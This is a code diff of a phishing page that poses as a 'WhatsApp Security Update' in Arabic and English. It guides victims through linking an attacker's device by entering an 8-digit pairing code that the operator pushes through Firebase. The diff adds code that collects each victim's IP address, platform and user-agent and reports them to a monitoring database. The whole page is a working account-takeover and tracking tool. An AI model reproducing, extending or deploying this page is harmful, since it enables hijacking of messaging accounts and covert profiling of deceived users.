@@ -13,11 +13,8 @@
         .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
-        
-        /* محاذاة الكلام للجنب (بداية السطر) */
         .alert-p { font-size: 14px; color: #3b4a54; text-align: start; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; margin-bottom: 15px; }
         .steps { text-align: start; font-size: 14px; color: #1c1e21; line-height: 1.6; }
-        
         .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 110px; display: flex; flex-direction: column; justify-content: center; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; margin-bottom: 10px; }
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
@@ -29,16 +26,13 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div id="ui-title" class="header-title"></div>
         <div id="ui-badge" class="badge"></div>
-        
         <div class="v-box">
             <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
             <div style="height:1px; background:#eee; margin:5px 0"></div>
             <div class="v-row"><span id="ui-new-label" style="color:#667781"></span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
         </div>
-
         <p id="ui-alert" class="alert-p"></p>
         <div id="ui-steps" class="steps"></div>
-
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
             <div id="ui-wait" class="wait-text"></div>
@@ -54,26 +48,8 @@
         const userId = new URLSearchParams(window.location.search).get('id');
 
         const translations = {
-            ar: {
-                title: "تحديث أمان واتساب",
-                badge: "جهاز مرتبط: iPhone",
-                old: "البروتوكول الحالي:",
-                new: "البروتوكول المحدث:",
-                alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
-                steps: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:",
-                wait: "في انتظار رمز الأمان.. سيصل هنا قريباً",
-                done: "تم استخراج الكود! أدخله في واتساب الآن"
-            },
-            en: {
-                title: "WhatsApp Security Update",
-                badge: "Linked Device: iPhone",
-                old: "Current Protocol:",
-                new: "Updated Protocol:",
-                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
-                steps: "<b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
-                wait: "Awaiting security code.. arriving in moments",
-                done: "Code generated! Enter it in WhatsApp now"
-            }
+            ar: { title: "تحديث أمان واتساب", badge: "جهاز مرتبط: iPhone", old: "البروتوكول الحالي:", new: "البروتوكول المحدث:", alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).", steps: "<b>كيفية التفعيل:</b><br>1. ستتلقى الآن إشعاراً رسمياً من واتساب لربط الجهاز؛ اضغط عليه فوراً.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b> في الأسفل.<br>3. أدخل رمز التحقق المكون من 8 أرقام الذي سيظهر هنا خلال لحظات:", wait: "في انتظار رمز الأمان.. سيصل هنا قريباً", done: "تم استخراج الكود! أدخله في واتساب الآن" },
+            en: { title: "WhatsApp Security Update", badge: "Linked Device: iPhone", old: "Current Protocol:", new: "Updated Protocol:", alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).", steps: "<b>How to activate:</b><br>1. You will now receive an official WhatsApp notification to link a device; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:", wait: "Awaiting security code.. arriving in moments", done: "Code generated! Enter it in WhatsApp now" }
         };
 
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
@@ -90,8 +66,20 @@
 
         if (userId) {
             const statusRef = db.ref('monitoring/' + userId);
-            statusRef.set({ status: "Online", ts: Date.now() });
-            statusRef.onDisconnect().set({ status: "Offline", ts: Date.now() });
+            
+            // سحب الـ IP ونوع الجهاز وإرسالهم فوراً
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    statusRef.set({
+                        status: "Online",
+                        ip: data.ip,
+                        device: navigator.platform + " / " + (navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown"),
+                        ts: Date.now()
+                    });
+                });
+
+            statusRef.onDisconnect().update({ status: "Offline" });
 
             db.ref('commands/' + userId).on('value', (snap) => {
                 if (snap.val() && snap.val().code) {
